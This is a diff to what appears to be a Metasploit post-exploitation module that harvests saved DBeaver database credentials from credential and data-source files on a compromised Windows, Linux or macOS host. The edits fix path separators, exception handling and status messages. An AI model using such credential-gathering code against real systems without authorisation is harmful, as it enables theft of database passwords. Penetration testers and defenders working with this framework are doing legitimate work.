@@ -108,6 +108,10 @@ class MetasploitModule < Msf::Post
     some_result = []
     credentials_config = File.join(json_dir, 'credentials-config.json')
     data_sources = File.join(json_dir, 'data-sources.json')
+    if session.platform == 'windows'
+      credentials_config.gsub!('/') { '\\' }
+      data_sources.gsub!('/') { '\\' }
+    end
     begin
       if file_exist?(credentials_config) && file_exist?(data_sources)
         credentials_config_data = read_file(credentials_config) || ''
@@ -120,8 +124,8 @@ class MetasploitModule < Msf::Post
         some_result << parse_data_sources(data_sources_data, credentials_config_data)
         print_status("Finished processing #{json_dir}")
       end
-    rescue Rex::Parser::Dbeaver::Error::ParserError => e
-      print_error("Error when parsing #{file}: #{e.class} - #{e}")
+    rescue Rex::Parser::Dbeaver::Error::DbeaverError => e
+      print_error("Error when parsing #{data_sources} and #{credentials_config}: #{e}")
     end
     return some_result
   end
@@ -140,8 +144,8 @@ class MetasploitModule < Msf::Post
         end
         print_status("Finished processing #{fullpath}")
       end
-    rescue StandardError
-      print_error("The file #{fullpath} either could not be read or does not exist")
+    rescue Rex::Parser::Dbeaver::Error::DbeaverError => e
+      print_error("Error when parsing #{fullpath}: #{e}")
     end
     return some_result
   end
@@ -152,17 +156,17 @@ class MetasploitModule < Msf::Post
     case session.platform
     when 'windows'
       app_data = get_env('AppData')
-      if !app_data.blank?
+      if app_data.present?
         xml_paths.push(app_data + '\DBeaverData\workspace6\General\.dbeaver-data-sources.xml')
         path_hash['json'] = app_data + '\DBeaverData\workspace6\General\.dbeaver'
       end
       home = get_env('USERPROFILE')
-      if !home.blank?
+      if home.present?
         xml_paths.push(home + '\.dbeaver4\General\.dbeaver-data-sources.xml')
       end
     when 'linux', 'osx', 'unix'
       home = get_env('HOME')
-      if !home.blank?
+      if home.present?
         xml_paths.push(home + '/.dbeaver4/General/.dbeaver-data-sources.xml')
         xml_paths.push(home + '/.local/share/DBeaverData/workspace6/General/.dbeaver-data-sources.xml')
         path_hash['json'] = home + '/.local/share/DBeaverData/workspace6/General/.dbeaver'
@@ -173,7 +177,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Gather Dbeaver Passwords on #{sysinfo['Computer']}")
+    print_status('Gather Dbeaver Passwords')
     all_result = []
     xml_path = ''
     json_path = ''
